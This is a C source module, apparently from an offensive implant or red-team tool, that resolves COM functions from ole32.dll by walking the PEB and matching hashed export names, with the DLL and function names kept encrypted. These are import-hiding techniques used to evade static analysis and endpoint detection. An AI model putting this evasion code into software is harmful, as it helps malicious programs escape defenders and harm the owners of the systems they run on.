/*
 * com_peb.c — PEB-resolved COM API singleton
 *
 * Resolves CoInitializeEx, CoCreateInstance, CoSetProxyBlanket,
 * CoUninitialize from ole32.dll via PEB-walk.
 */
#include "com_peb.h"
#include "config.h"
#include "enc_strings.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"

static com_api_t g_com;

const com_api_t *mirage_com_api(void) {
    if (g_com.ready) return &g_com;

    char dll[32];
    enc_decrypt(enc_ole32, ENC_OLE32_LEN, dll);
    void *mod = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!mod) return NULL;

    char fn[32];

    enc_decrypt(enc_CoInitializeEx, ENC_COINITIALIZEEX_LEN, fn);
    g_com.pInit = (pCoInitializeEx)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_CoCreateInstance, ENC_COCREATEINSTANCE_LEN, fn);
    g_com.pCreate = (pCoCreateInstance)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_CoSetProxyBlanket, ENC_COSETPROXYBLANKET_LEN, fn);
    g_com.pBlanket = (pCoSetProxyBlanket)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_CoUninitialize, ENC_COUNINITIALIZE_LEN, fn);
    g_com.pUninit = (pCoUninitialize)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    if (!g_com.pInit || !g_com.pCreate || !g_com.pBlanket || !g_com.pUninit)
        return NULL;

    g_com.ready = 1;
    return &g_com;
}

#ifdef ZIALFI_TEST_MODE
void mirage_com_api_install(const com_api_t *mock) {
    if (mock) {
        g_com = *mock;
        g_com.ready = 1;
    }
}
#endif
